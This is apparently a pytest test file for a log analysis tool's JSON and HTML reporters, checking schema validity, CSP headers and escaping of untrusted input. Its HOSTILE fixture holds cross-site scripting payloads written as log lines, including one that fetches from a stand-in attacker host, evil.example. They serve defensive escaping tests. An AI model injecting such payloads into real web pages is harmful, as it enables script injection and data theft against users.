from __future__ import annotations

import html
import json
import re
from pathlib import Path

import jsonschema
import pytest
from referencing import Registry, Resource

import logfold
from logfold import ConfigError
from test_diff import synthetic_pair

SCHEMA_DIR = Path(__file__).resolve().parent.parent / "docs" / "schema"
HOSTILE = [
    "2026-10-04T12:00:00Z ERROR <script>alert(1)</script> failed for <img src=x onerror=alert(2)> now",
    '2026-10-04T12:00:01Z WARN user "><svg onload=alert(3)> logged in',
    "2026-10-04T12:00:02Z INFO </script><script>fetch('http://evil.example/x')</script>",
] * 3


def validator(name: str) -> jsonschema.Draft202012Validator:
    resources = {}
    for path in SCHEMA_DIR.glob("*.schema.json"):
        schema = json.loads(path.read_text(encoding="utf-8"))
        resources[path.name] = Resource.from_contents(schema)
    registry = Registry().with_resources(list(resources.items()))
    schema = json.loads((SCHEMA_DIR / name).read_text(encoding="utf-8"))
    return jsonschema.Draft202012Validator(schema, registry=registry)


@pytest.fixture
def hostile_log(tmp_path: Path) -> Path:
    path = tmp_path / "hostile.log"
    path.write_text("\n".join(HOSTILE) + "\n", encoding="utf-8")
    return path


def test_analysis_json_matches_schema(corpus_dir: Path) -> None:
    result = logfold.analyze(str(corpus_dir / "app.log"), format="app")
    payload = json.loads(result.to_json())
    validator("analysis-v1.schema.json").validate(payload)
    assert payload["template_count"] == len(result.templates)
    assert payload["templates"][0]["count"] == result.templates[0].count


def test_json_limit_and_file_output(corpus_dir: Path, tmp_path: Path) -> None:
    result = logfold.analyze(str(corpus_dir / "app.log"), format="app")
    out = tmp_path / "out.json"
    text = result.to_json(out, limit=2)
    assert out.read_text(encoding="utf-8") == text
    payload = json.loads(text)
    assert len(payload["templates"]) == 2
    assert payload["template_count"] == len(result.templates)


def test_diff_json_matches_schema(tmp_path: Path) -> None:
    before, after, _truth = synthetic_pair(tmp_path, 4)
    result = logfold.diff(str(before), str(after), format="app")
    payload = json.loads(result.to_json())
    validator("diff-v1.schema.json").validate(payload)
    assert payload["summary"]["new"] == len(result.new_templates)
    assert payload["summary"]["new_alerts"] == len(result.new_alerts)


def test_html_escapes_untrusted_log_content(hostile_log: Path) -> None:
    result = logfold.analyze(str(hostile_log), format="app")
    document = result.to_html()
    assert "<script>alert" not in document
    assert "<img src=x" not in document
    assert "<svg onload" not in document
    assert "fetch('http://evil" not in document
    assert document.count("<script>") == 1
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in document


def test_html_has_strict_csp_and_no_external_resources(hostile_log: Path) -> None:
    document = logfold.analyze(str(hostile_log), format="app").to_html()
    policy = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', document)
    assert policy is not None
    content = html.unescape(policy.group(1))
    assert "default-src 'none'" in content
    assert "'unsafe-inline'" not in content
    assert "sha256-" in content
    assert not re.search(r'(src|href)="https?://', document)


def test_html_csp_hashes_match_inline_blocks(hostile_log: Path) -> None:
    import base64
    import hashlib

    document = logfold.analyze(str(hostile_log), format="app").to_html()
    style = re.search(r"<style>(.*?)</style>", document, re.S)
    script = re.search(r"<script>(.*?)</script>", document, re.S)
    assert style is not None and script is not None  # noqa: PT018
    for block in (style.group(1), script.group(1)):
        digest = base64.b64encode(hashlib.sha256(block.encode("utf-8")).digest()).decode("ascii")
        assert f"sha256-{digest}" in document


def test_html_escapes_filenames_and_diff_content(tmp_path: Path) -> None:
    before = tmp_path / "a&b'c.log"
    after = tmp_path / "after.log"
    before.write_text("\n".join(HOSTILE[:3]) + "\n", encoding="utf-8")
    after.write_text("2026-10-04T12:00:05Z ERROR <script>alert(9)</script> brand new\n", encoding="utf-8")
    document = logfold.diff(str(before), str(after), format="app").to_html()
    assert "a&b'c" not in document
    assert "<script>alert" not in document
    assert "a&amp;b&#x27;c" in document


def test_html_limit_note(corpus_dir: Path) -> None:
    result = logfold.analyze(str(corpus_dir / "noisy.log"), format="plain")
    document = result.to_html(limit=3)
    assert "Showing the 3 most frequent" in document


def test_text_reporter_shapes(corpus_dir: Path, tmp_path: Path) -> None:
    result = logfold.analyze(str(corpus_dir / "app.log"), format="app")
    text = result.render("text", top=2)
    assert "records" in text
    assert "more templates" in text
    before, after, _truth = synthetic_pair(tmp_path, 6)
    diff_text = logfold.diff(str(before), str(after), format="app").render("text")
    assert "New templates" in diff_text
    assert "Disappeared templates" in diff_text


def test_unknown_reporter_is_a_config_error(corpus_dir: Path) -> None:
    result = logfold.analyze(str(corpus_dir / "app.log"), format="app")
    with pytest.raises(ConfigError, match="unknown reporter"):
        result.render("pdf")
